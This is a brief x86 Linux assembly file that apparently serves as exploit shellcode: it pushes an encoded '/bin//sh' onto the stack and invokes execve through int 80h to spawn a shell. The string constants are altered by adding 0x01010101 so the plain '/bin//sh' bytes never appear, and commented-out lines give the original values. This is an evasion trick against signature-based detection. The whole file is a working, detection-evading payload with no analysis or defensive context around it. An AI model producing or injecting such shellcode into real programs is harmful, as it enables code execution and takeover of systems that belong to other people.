section .text
	global _start

_start:
	xor eax, eax
	push eax
	

	mov ebx, 0x67722e2e
	add ebx, 0x01010101

	push ebx
	;push 0x68732f2f ;hs//
	

	mov ebx, 0x6d68612e
	add ebx, 0x01010101
	
	push ebx
	;push 0x6e69622f ;nib/
	

	mov ebx, esp
	push eax
	push ebx
	mov ecx, esp
	mov al, 11
	int 80h
